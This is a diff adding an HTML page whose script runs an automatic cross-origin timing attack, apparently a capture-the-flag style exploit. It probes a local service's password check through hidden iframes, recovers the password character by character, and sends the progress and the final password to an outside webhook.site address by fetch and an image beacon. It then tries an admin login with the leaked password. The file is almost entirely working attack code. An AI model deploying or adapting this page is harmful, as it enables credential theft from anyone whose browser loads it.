@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head><title>Reliable Sequential Attack</title></head>
+<body>
+<h1>Reliable sequential timing attack...</h1>
+<pre id="output"></pre>
+<div id="container" style="position:absolute;left:-9999px;"></div>
+<script>
+const output = document.getElementById('output');
+const container = document.getElementById('container');
+const TARGET = 'https://127.0.0.1:9999/';
+const CHARSET = '0123456789abcdef';
+let knownPassword = 'lebah';
+
+function log(msg) {
+    output.textContent += msg + '\n';
+    console.log(msg);
+}
+
+// Test ONE candidate with MULTIPLE measurements for reliability
+async function measureReliably(pass, attempts = 3) {
+    const timings = [];
+    
+    for (let i = 0; i < attempts; i++) {
+        const timing = await new Promise((resolve) => {
+            const start = performance.now();
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = TARGET + '?pass=' + encodeURIComponent(pass);
+            
+            let resolved = false;
+            
+            const cleanup = () => {
+                if (iframe.parentNode) container.removeChild(iframe);
+            };
+            
+            const timeout = setTimeout(() => {
+                if (!resolved) {
+                    const elapsed = performance.now() - start;
+                    cleanup();
+                    resolved = true;
+                    resolve(elapsed);
+                }
+            }, 1000);
+            
+            iframe.onload = () => {
+                if (!resolved) {
+                    const elapsed = performance.now() - start;
+                    clearTimeout(timeout);
+                    cleanup();
+                    resolved = true;
+                    resolve(elapsed);
+                }
+            };
+            
+            iframe.onerror = () => {
+                if (!resolved) {
+                    const elapsed = performance.now() - start;
+                    clearTimeout(timeout);
+                    cleanup();
+                    resolved = true;
+                    resolve(elapsed);
+                }
+            };
+            
+            container.appendChild(iframe);
+        });
+        
+        timings.push(timing);
+        
+        // Small delay between measurements
+        await new Promise(resolve => setTimeout(resolve, 100));
+    }
+    
+    // Calculate average and check consistency
+    const avg = timings.reduce((a, b) => a + b, 0) / timings.length;
+    const max = Math.max(...timings);
+    const min = Math.min(...timings);
+    const variance = max - min;
+    
+    return { 
+        pass, 
+        avg, 
+        max, 
+        min, 
+        variance, 
+        timings,
+        isMatch: avg > 400 && variance < 300  // Reliable threshold
+    };
+}
+
+async function leakPassword() {
+    log('[*] RELIABLE sequential timing attack');
+    log('[*] 3 measurements per candidate for consistency');
+    log('[*] Known prefix: ' + knownPassword + '\n');
+    
+    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=reliable_attack_started').catch(e=>{});
+    
+    // Leak 12 hex chars sequentially
+    for (let pos = 0; pos < 12; pos++) {
+        log(`[*] Position ${pos+1}/12...`);
+        let found = false;
+        
+        // Test each character sequentially with multiple measurements
+        for (let c of CHARSET) {
+            const candidate = knownPassword + c;
+            const result = await measureReliably(candidate, 3);
+            
+            log(`  "${c}": avg=${result.avg.toFixed(0)}ms, var=${result.variance.toFixed(0)}ms ${result.isMatch ? '✓ MATCH!' : ''}`);
+            
+            if (result.isMatch) {
+                knownPassword = candidate;
+                log(`\n  [+] RELIABLE MATCH: '${c}' -> ${knownPassword}`);
+                log(`  Timings: [${result.timings.map(t => t.toFixed(0)).join(', ')}]ms\n`);
+                
+                // Send progress
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
+                
+                found = true;
+                break;
+            }
+        }
+        
+        if (!found) {
+            log(`\n  [-] No reliable match at position ${pos+1}`);
+            log(`  Taking best guess based on highest average timing...`);
+            
+            // If no clear winner, take the one with highest average
+            let bestChar = '0';
+            let bestAvg = 0;
+            
+            for (let c of CHARSET) {
+                const candidate = knownPassword + c;
+                const result = await measureReliably(candidate, 1); // Quick single test
+                if (result.avg > bestAvg) {
+                    bestAvg = result.avg;
+                    bestChar = c;
+                }
+            }
+            
+            knownPassword += bestChar;
+            log(`  Best guess: '${bestChar}' (${bestAvg.toFixed(0)}ms) -> ${knownPassword}\n`);
+        }
+    }
+    
+    log('\n========================================');
+    log('FINAL PASSWORD: ' + knownPassword);
+    log('========================================');
+    
+    // Final exfiltration
+    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword)).catch(e=>{});
+    new Image().src = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?final=' + encodeURIComponent(knownPassword);
+    
+    log('\n[*] Testing login with leaked password...');
+    
+    // Test login
+    setTimeout(async () => {
+        try {
+            const response = await fetch(TARGET + 'login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `username=admin&password=${encodeURIComponent(knownPassword)}`,
+                credentials: 'include'
+            });
+            
+            const success = !response.url.includes('login') || response.redirected;
+            log(`Login test: ${success ? '✓ SUCCESS!' : '✗ Failed'}`);
+            
+            if (success) {
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?LOGIN_SUCCESS=' + encodeURIComponent(knownPassword)).catch(e=>{});
+            }
+        } catch (e) {
+            log('Login test failed: ' + e.message);
+        }
+    }, 2000);
+}
+
+setTimeout(leakPassword, 500);
+</script>
+</body>
+</html>
